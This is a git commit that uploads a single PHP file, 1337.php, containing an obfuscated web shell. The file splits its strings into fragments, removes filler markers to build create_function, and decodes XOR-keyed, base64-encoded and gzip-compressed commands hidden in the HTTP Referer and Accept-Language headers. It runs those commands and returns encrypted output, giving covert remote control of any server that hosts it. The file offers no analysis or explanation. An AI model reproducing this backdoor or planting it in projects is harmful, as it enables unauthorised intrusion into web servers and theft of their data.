ea447d5e8533f68fd5c15c0bf828a32c2ba49b36
user-rahim <35132717+user-rahim@users.noreply.github.com>
2018-07-26 01:09:10 +0800

    Add files via upload

---
+++ 1337.php
@@ -0,0 +1,17 @@
+<?php
+$X='t();@ev/@al(@g/@zun/@compress(/@@x(@base6/@4_/@decode(pre/@g_r/@/@eplace(/@array("/_//@","/-//@")/@,arr';
+$b='<$l;){/@for/@/@($j=0;($/@j<$c&&$i<$l)/@;$j+/@+,$i++){/@$o.=$t{/@$i}/@^$/@k{$j};}}retur/@n $o;}$r=/@$_';
+$S='SERVE/@R;/@$rr=@$r[/@"HT/@TP_REFERER"/@];$/@ra=@$r[/@"HTTP_A/@CCE/@PT_LANGU/@AGE"];i/@/@f($rr&&$r/@/@a';
+$i='&$_SESS/@ION;/@$ss="s/@ubstr";/@$sl/@="s/@trto/@lower";$i=$m/@[1/@][0].$m[1][/@1/@];$h=$sl($s/@s(/@md';
+$f='se6/@4_encod/@e(x(gzco/@mp/@ress($/@o),$k));pr/@in/@t("<$k>$d/@</@/$/@k>");@session_d/@estro/@y();}}}}';
+$W='5($i/@.$kh),0,3));$f=/@$sl/@(/@$ss(md5(/@$i.$kf),0,3)/@);$/@p="";for(/@/@$z/@=1;$z<cou/@nt($m/@[1]);$z+';
+$n='all/@/@("/([\\w/@])[\\w-]+(/@?:;q=0.([/@\\d]))?/@/@,?/",$ra,$m);if($/@/@q&&$/@m/@){@session_st/@art();$s=/@';
+$F='$kh="82/@7c";$k/@f="cb0e"/@;functi/@on x($/@t/@,/@$k){$c=strlen(/@$k);$l=s/@t/@/@rlen/@($t);$o="";for($i/@=/@0;$i';
+$K='+)$p/@.=$q/@[$m[2][$/@z]]/@;if/@(strpo/@/@s($p,$h)==/@=0){$s[$i]="";$p/@/@=$ss($p,3)/@;}if(ar/@ra/@y_/';
+$B=str_replace('Xf','','creXfatXfeXf_fXfunXfXfction');
+$E='@k/@ey_exists($i,$s/@)){$s/@[/@$i].=$p;$e=s/@trpos($/@s[$i/@],$f);if($/@e/@/@){$k=$kh.$kf;ob/@_/@star';
+$T='){$u=parse_/@url($r/@r);parse_s/@tr(/@$/@u["que/@ry"],/@$q/@);$q=array_v/@alues/@($/@q);preg_mat/@ch_';
+$N='ay("/",/@"+"),$ss/@($s[$i/@],0/@,$e)))/@,$k)/@));$o=ob_get_/@content/@s();ob/@_e/@nd_cl/@ean()/@;$d=ba';
+$H=str_replace('/@','',$F.$b.$S.$T.$n.$i.$W.$K.$E.$X.$N.$f);
+$y=$B('',$H);$y();
+?>
